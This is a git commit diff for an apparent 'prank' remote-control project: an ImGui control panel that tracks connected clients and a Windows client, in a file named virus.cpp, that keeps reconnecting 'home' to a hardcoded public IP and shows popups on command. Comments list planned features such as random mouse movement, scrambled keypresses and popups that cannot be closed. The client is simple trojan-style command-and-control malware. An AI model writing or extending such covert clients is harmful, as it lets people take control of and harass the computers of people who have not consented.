2412c828d3e45ac3ff04b4c5f21581c7ce955fd8
SnakeSnuggles <jacobsylvester6@gmail.com>
2025-04-20 12:58:35 -0600

    fixed many issues relating to networking and added a ping system to see of the client is still alive

--- control_pannel/src/control.cpp
+++ control_pannel/src/control.cpp
@@ -6,16 +6,17 @@
 #include <iostream>
 #include <asio.hpp>
 #include <mutex>
+#include <shared_mutex>
 #include <thread>
 #include <map>
 #include <memory>
 
 using asio::ip::tcp;
-
+using asio::ip::udp;
 
 enum packet_id {
     GET_DATA = 0,
-    POPUP_1 = 1
+    POPUP = 1
 };
 
 #pragma pack(push, 1)
@@ -23,6 +24,7 @@ struct Packet {
     packet_id id;
     union {
         int number;
+        packet_id packetid;
         double double_number;
         char str[256];
     };
@@ -41,15 +43,30 @@ public:
     void send(Packet packet) {
         asio::write(socket_, asio::buffer(&packet, sizeof(packet)));
     }
+
+    Packet receive(packet_id request_id) {
+
+        Packet packet{};
+        packet.id = packet_id::GET_DATA;
+        packet.packetid = request_id;
+    
+        send(packet);
+    
+        Packet incoming{};
+        asio::read(socket_, asio::buffer(&incoming, sizeof(Packet)));
+    
+        return incoming;
+    }
 };
 
 class Server {
 private:
     std::mutex client_mutex_;  
+    std::shared_mutex shared_client_mutex_;
     asio::io_context io_context_;
     tcp::acceptor acceptor_;
-    unsigned int current_id_;
-    std::map<int, std::unique_ptr<Client>> clients;
+    int current_id_;
+    std::map<int, std::unique_ptr<Client>> clients_;
 
 public:
     Server(const std::string& address, unsigned short port)
@@ -57,37 +74,93 @@ public:
           current_id_(0) {}
 
     void handle_client_connect() {
-        auto socket = std::make_unique<tcp::socket>(io_context_);
-        asio::error_code ec;
-
         while(true) {
+            auto socket = std::make_unique<tcp::socket>(io_context_);
+            asio::error_code ec;
             ec = acceptor_.accept(*socket, ec);
-            if (ec)
-                continue;
-
+            if (ec) continue;
+            
             std::lock_guard<std::mutex> lock(client_mutex_);
             auto client = std::make_unique<Client>(std::move(*socket));
-            clients[current_id_++] = std::move(client);
-            std::cout << "Client connected!" << std::endl;
-            std::this_thread::sleep_for(std::chrono::seconds(5));
+            clients_[current_id_++] = std::move(client);
         }
     }
 
-    void send_to_client(unsigned int id, Packet packet) {
+    void send_to_client(int id, Packet packet) {
         std::lock_guard<std::mutex> lock(client_mutex_);
-        if (clients.count(id)) {
-            clients[id]->send(packet);
+        try {
+            if(id == -1) {
+                std::cout << "Please select a client";
+                return;
+            }
+            if (clients_.count(id)) {
+                clients_[id]->send(packet);
+            }
+        } catch (const std::exception& e ) {
+            std::cout << "That client does not exist \n";
         }
+    }
+
+    void all_client_send(Packet packet) {
+        std::lock_guard<std::mutex> lock(client_mutex_);
+        for(const auto& pair : clients_) {
+            pair.second->send(packet);
+        }
+    }
+
+
+    void check_if_client_alive() {
+        while (true) {
+            std::map<int, std::unique_ptr<Client>> still_alive;
+    
+            {
+                std::lock_guard<std::mutex> lock(client_mutex_);
+                for (auto& [id, client] : clients_) {
+                    try {
+                        Packet result = client->receive(packet_id::GET_DATA);
+                        if (result.number == 1) {
+                            still_alive[id] = std::move(client);  
+                        } else {
+                            std::cerr << "Client " << id << " returned unexpected data\n";
+                        }
+                    } catch (const std::exception& e) {
+                        std::cerr << "Client " << id << " failed ping: " << e.what() << "\n";
+                    }
+                }
+    
+                clients_ = std::move(still_alive);
+            }
+    
+            std::this_thread::sleep_for(std::chrono::seconds(1));
+        }
+    }
+
+    std::vector<int> get_connected_clients() {
+        std::shared_lock<std::shared_mutex> lock(shared_client_mutex_);
+        std::vector<int> cl;
+        for(const auto& pair : clients_) {
+            cl.push_back(pair.first);
+        }
+        return cl;
+    }
+
+    bool is_client_connected(int selected_client) {
+        std::lock_guard<std::mutex> lock(client_mutex_);
+        auto connected = get_connected_clients();
+        if (std::find(connected.begin(), connected.end(), selected_client) == connected.end()) {
+            return false;
+        }
+        return true;
     }
 };
 
 
 int main() {
+
     if (!glfwInit()) return -1;
     GLFWwindow* w = glfwCreateWindow(640, 480, "control pannel", 0, 0);
     if (!w) return glfwTerminate(), -1;
     glfwMakeContextCurrent(w);
-
     IMGUI_CHECKVERSION();
     ImGui::CreateContext();
     ImGui_ImplGlfw_InitForOpenGL(w, true);
@@ -96,19 +169,66 @@ int main() {
     
     static ImVec4 background_color = ImVec4(0.102f, 0.102f, 0.102f, 1.0f);
 
-    Server server{"127.0.0.1", 1234};
+    Server server{"10.0.0.87", 1234};
+    char text_buffer[256] = "";
+
+
     std::thread accept_thread([&server]() {
         server.handle_client_connect();
     });
-    char text_buffer[256] = "";
     accept_thread.detach();
+    std::thread alive_thread([&server]() {
+        server.check_if_client_alive();
+    });
+    alive_thread.detach();
+
+
+    int selected_client = -1;
     while (!glfwWindowShouldClose(w)) {
+   //     std::cout << "main loop start\n"; 
         glfwPollEvents();
         ImGui_ImplOpenGL3_NewFrame();
         ImGui_ImplGlfw_NewFrame();
 
         ImGui::NewFrame();
         
+        // std::cout << "get connected clients start\n"; 
+
+        ImGui::Begin("Send Data");
+        /*
+            - open an image from a link
+                - or maybe send the image to be downloaded and then shown
+            - send a pop up with a message of my choosing
+                - group mode (a few pop ups)
+                - life bar (how many times you have to close the popup before it does not come back)
+                - infinite life mode
+                - create popup that avoids the mouse
+
+            - send link which gets opened in a browseien
+            - make it so keyboard presses become a random key (t)
+            - send tts message
+        */
+        //std::cout << "before popup\n";
+            ImGui::Text("Popup");
+            ImGui::SameLine();
+            ImGui::InputText("",text_buffer, sizeof(text_buffer));
+            ImGui::SameLine();
+            if(ImGui::Button("Send")) {
+                if(server.is_client_connected(selected_client)) {
+                    Packet packet{POPUP};
+                    std::strcpy(packet.str, text_buffer);
+                    server.send_to_client(selected_client, packet);
+                    std::strcpy(text_buffer, "");
+                } else if(selected_client == -1) {
+                    std::cout << "Please select a client";
+                }
+                else {
+                    std::cout << "client no longer connected\n";
+                }
+            }
+        // std::cout << "after popup\n";
+        ImGui::End();
+
         ImGui::Begin("Mouse");
         /*
             - make mouse move randomly (t)
@@ -133,33 +253,6 @@ int main() {
         */
         ImGui::End();
 
-        ImGui::Begin("Send Data");
-        /*
-            - open an image from a link
-                - or maybe send the image to be downloaded and then shown
-            - send a pop up with a message of my choosing
-                - group mode (a few pop ups)
-                - life bar (how many times you have to close the popup before it does not come back)
-                - infinite life mode
-                - create popup that avoids the mouse
-
-            - send link which gets opened in a browser
-            - make it so keyboard presses become a random key (t)
-            - send tts message
-        */
-            ImGui::Text("Popup");
-            ImGui::SameLine();
-            ImGui::InputText("",text_buffer, sizeof(text_buffer));
-            ImGui::SameLine();
-            if(ImGui::Button("Send")) {
-                Packet packet{POPUP_1};
-                std::strcpy(packet.str,text_buffer);
-                server.send_to_client(0,packet);
-
-                std::cout << "Text sent: " << text_buffer << "\n";
-                std::strcpy(text_buffer,"");
-            }
-        ImGui::End();
 
         ImGui::Begin("Manage");
         /*
@@ -169,9 +262,28 @@ int main() {
             - A log of pranks ran
             - Add a prank schedual
         */
+            //std::cout << "before get connected clients start\n"; 
+            std::vector<int> clients = server.get_connected_clients();
+            for(auto id : clients) {
+                //std::cout << "inside loop\n"; 
+                if(clients.size() == 0) {
+                    // std::cout << "Not enough clients\n"; 
+                    break;
+                }
+                std::string lable = "Client: " + std::to_string(id);
+                if(selected_client == id) {
+                    ImGui::PushStyleColor(ImGuiCol_Button, ImVec4(0.2f, 0.6f, 0.9f, 1.0f));
+                }
+                if(ImGui::Button(lable.c_str())) {
+                    std::cout << "selected client: " << id << "\n";
+                    selected_client = id;
+                }
+                if(selected_client == id) {
+                    ImGui::PopStyleColor(1); 
+                }
+            }
+            //std::cout << "end of loop\n"; 
         ImGui::End();
-
-
 
         ImGui::Begin("customize");
             ImGui::ColorPicker3("Background", (float*)&background_color);
@@ -180,7 +292,7 @@ int main() {
         ImGui::Render();
         int w_, h_; glfwGetFramebufferSize(w, &w_, &h_);
         glViewport(0, 0, w_, h_);
-        glClearColor(background_color.x, background_color.y, background_color.y, 1.0f);
+        glClearColor(background_color.x, background_color.y, background_color.z, 1.0f);
         glClear(GL_COLOR_BUFFER_BIT);
         ImGui_ImplOpenGL3_RenderDrawData(ImGui::GetDrawData());
         glfwSwapBuffers(w);
--- virus/src/virus.cpp
+++ virus/src/virus.cpp
@@ -1,12 +1,13 @@
 #include <iostream>
 #include <asio.hpp>
+#include <thread>
 #include <windows.h>
 
 using asio::ip::tcp;
 
 enum packet_id {
     GET_DATA = 0,
-    POPUP_1 = 1
+    POPUP = 1
 };
 
 #pragma pack(push, 1)
@@ -14,49 +15,64 @@ struct Packet {
     packet_id id;
     union {
         int number;
+        packet_id packetid;
         double double_number;
         char str[256];
     };
-
-    Packet() : id(GET_DATA) { // Default constructor
-        std::memset(str, 0, sizeof(str)); // Ensure str is initialized
-    }
+    
 };
 #pragma pack(pop)
+
 void show_popup(const char* message) {
     MessageBoxA(NULL, message, "Popup", MB_OK | MB_ICONINFORMATION);
 }
 int main() {
-    try {
-        asio::io_context io_context;
+    while(true) {
+        std::cout << "trying to connect to home\n";
+        try {
+            asio::io_context io_context;
 
-        tcp::resolver resolver(io_context);
-        auto endpoints = resolver.resolve("127.0.0.1", "1234");
+            tcp::resolver resolver(io_context);
+            auto endpoints = resolver.resolve("70.77.121.59", "1234");
 
-        tcp::socket socket(io_context);
-        asio::connect(socket, endpoints);
+            tcp::socket socket(io_context);
+            asio::connect(socket, endpoints);
+            std::cout << "connect to home yayayayayayayayyayay\n";
 
-        while (true) {
-            Packet packet;
-            std::size_t len = asio::read(socket, asio::buffer(&packet, sizeof(Packet)));
+            while (true) {
+                Packet packet;
+                std::size_t len = asio::read(socket, asio::buffer(&packet, sizeof(Packet)));
 
-            // Check that we read the full packet
-            if (len == sizeof(Packet)) {
-                switch (packet.id) {
-                    case POPUP_1:
-                        show_popup(packet.str);
-                        break;
-                    default:
-                        break;
+                // Check that we read the full packet
+                if (len == sizeof(Packet)) {
+                    switch (packet.id) {
+                        case GET_DATA:
+                            // Offload to a separate thread
+                            std::thread([&socket, packet]() {
+                                if (packet.id == packet_id::GET_DATA) {
+                                    Packet alive_packet{};
+                                    alive_packet.id = packet_id::GET_DATA;
+                                    alive_packet.number = 1;
+                                    asio::write(socket, asio::buffer(&alive_packet, sizeof(alive_packet)));
+                                }
+                            }).detach();                       
+                            break;
+                        case POPUP:
+                            show_popup(packet.str);
+                            std::cout << "recived text: " << packet.str << "\n";
+                            break;
+                        default:
+                            break;
+                    }
+                } else {
+                    std::cerr << "Error: Incomplete packet received." << std::endl;
                 }
-            } else {
-                std::cerr << "Error: Incomplete packet received." << std::endl;
             }
+
+        } catch (std::exception& e) {
+            std::cout << "failed to connect to home \n";
+            std::cerr << "Exception: " << e.what() << "\n";
         }
-
-    } catch (std::exception& e) {
-        std::cerr << "Exception: " << e.what() << "\n";
     }
-
     return 0;
 }
